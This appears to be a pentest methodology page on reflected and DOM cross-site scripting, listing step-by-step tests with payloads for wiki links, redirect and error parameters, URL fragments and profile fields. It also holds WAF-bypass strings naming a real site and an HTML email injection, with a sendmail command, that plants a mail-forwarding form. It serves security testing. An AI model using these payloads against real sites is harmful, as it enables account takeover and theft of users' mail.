# Reflected Cross Site Scripting

## Check List

## Methodology

### Black Box

#### XSS Reflected

{% stepper %}
{% step %}
Log in to any platform that allows creating or editing text-based pages (such as a Wiki or documentation system)
{% endstep %}

{% step %}
Create a new page
{% endstep %}

{% step %}
In the field for the page identifier or slug, enter `javascript:`
{% endstep %}

{% step %}
Configure the page as follows

Title: `javascript:`

Format: Markdown

Content: `[XSS](.alert(1);)`
{% endstep %}

{% step %}
Save or publish the page
{% endstep %}

{% step %}
After the page is created, click the link labeled “XSS” in the page content
{% endstep %}

{% step %}
If the system is vulnerable, the JavaScript code will execute (e.g., an `alert(1)` will appear)
{% endstep %}
{% endstepper %}

***

#### XSS IN Email

{% stepper %}
{% step %}
Create a new text file (e.g. `email.txt`)
{% endstep %}

{% step %}
Put the following exact contents into the file (including headers and `Content-type: text/html`)

```http
From: jouko@klikki.fi
To: jouko@hey.com
Subject: HackerOne test
MIME-Version: 1.0
Content-type: text/html

<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
</style>
```
{% endstep %}

{% step %}
Send the email using `sendmail` on Linux as an example

```bash
/usr/sbin/sendmail -t < email.txt
```

(or use any other tool capable of sending raw MIME/HTML emails)
{% endstep %}

{% step %}
Open the recipient’s HEY account and load the sent email (refresh the inbox/viewer if needed)
{% endstep %}

{% step %}
Inspect the rendered HTML to find injected tags or form elements (e.g. injected `<form ...>` or `<iframe ...>`)
{% endstep %}

{% step %}
Observe any automatic behaviors triggered by the injected HTML (such as POST requests to create forwarding or a full-window iframe)
{% endstep %}

{% step %}
Repeat with the alternative payload examples from the report (iframe-based spoof or `<script src=...>` + hcaptcha payload) to verify other exploitation vectors
{% endstep %}
{% endstepper %}

***

#### Reflected XSS In Marketing Reports Page

{% stepper %}
{% step %}
Log in to the store's website and complete the authentication process
{% endstep %}

{% step %}
Then go to the report section in your profile
{% endstep %}

{% step %}
When you enter the page, check the URL and find parameters like `return_page_pathname=` (may be different in each site)
{% endstep %}

{% step %}
Inject the parameter using the following payload and check if the code is executed or not

```
javascript:alert('XSS')
```
{% endstep %}

{% step %}
If it is implemented, we hit a vulnerability
{% endstep %}
{% endstepper %}

***

#### Reflected cross site scripting (XSS) attacks

{% stepper %}
{% step %}
Enter a site and complete the authentication process
{% endstep %}

{% step %}
In the authentication process, make an error on one of the parameters so that the authentication process fails
{% endstep %}

{% step %}
If you encounter errmssg parameters in subsequent requests, inject xss-related payloads in these parameters
{% endstep %}

{% step %}
For example, like this request below

```
errmsg = [https://102.176.160.119:10443/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E]
```
{% endstep %}
{% endstepper %}

***

#### DOM XSS

{% stepper %}
{% step %}
Bring up the Burp tool and make a request to the main page of the site
{% endstep %}

{% step %}
In the Response section, click on the search section and search for the word `window.location.hash` and check if it exists or not
{% endstep %}

{% step %}
If there is, inject the payload as shown below and see if it is reflected or not

```
https://www.example.com/#<img src=x onerror=alert('XSS')>
```
{% endstep %}
{% endstepper %}

***

#### DOMXSS in redirect param

{% stepper %}
{% step %}
Logout website
{% endstep %}

{% step %}
Get the request using Burp and check the request
{% endstep %}

{% step %}
In the requests review, if you find a request like the one below, inject the payload

```
https://subdomain.example.net/?redirect=javascript:prompt(document.domain)%2f%2f 
```
{% endstep %}

{% step %}
Log in through email
{% endstep %}
{% endstepper %}

***

#### XSS Reflected in Redirect\_url

{% stepper %}
{% step %}
Log in to the site and complete the registration process
{% endstep %}

{% step %}
Trace the registration process using Burp and inspect the parameters
{% endstep %}

{% step %}
If you see a parameter called redirect\_url, inject the following payload as shown below:

```http
https://example.net/resign_request/success?next_url=javascript%3Aalert%2F**%2F(document.domain)
```
{% endstep %}

{% step %}
If the code is reflected, the vulnerability has occurred
{% endstep %}
{% endstepper %}

***

#### Payload For WAF Bypass

{% stepper %}
{% step %}
```http
https://www.example.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'
```
{% endstep %}

{% step %}
```http
https://www.example.com.br/testing%2522%FF%2520accesskey='x'%2520onclick='confirm%601%60'
```
{% endstep %}

{% step %}
```http
https://www.starbucks.com.br/testing%80%2522%2520accesskey='x'%2520onclick='confirm%601%60'
```
{% endstep %}
{% endstepper %}

***

#### Location Information Parameter&#x20;

{% stepper %}
{% step %}
Log in to your account and profile on the target site
{% endstep %}

{% step %}
Go to the general section of your account and enter the street address, city, and the following payload

```javascript
/"><!--><svg/onload=alert(document.domain)>)
```
{% endstep %}

{% step %}
After injection, save and log in to see your location information and live view
{% endstep %}

{% step %}
For example, something like the path below (keep in mind that this path can be different for each site)

```http
https://example.com/user/dashboards/live
```
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
